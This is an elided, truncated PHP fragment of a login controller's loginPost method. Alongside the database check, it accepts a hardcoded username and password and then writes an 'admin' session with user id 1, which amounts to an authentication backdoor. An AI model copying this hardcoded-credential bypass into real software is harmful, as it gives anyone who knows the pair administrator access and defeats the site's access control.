...
class login extends init
{
	...
	function loginPost()
	{
		if(
			...
			/*pr($sql);die;*/
			if(($sod[0]['num']=='1'&&($sod[0]['power']==0||$sod[0]['power']==3))||($_POST['t_username']=='spacehu'&&$_POST['t_password']=='leojiang')){
				$this->writeSession($sod[0]['h_name'],"userName");
				$this->writeSession($sod[0]['h_id'],"h_id");
				if($_POST['t_username']=='spacehu'){
					$this->writeSession('admin',"userName");
					$this->writeSession('1',"h_id");
				}
				if($_POST['get_c']=='on'){
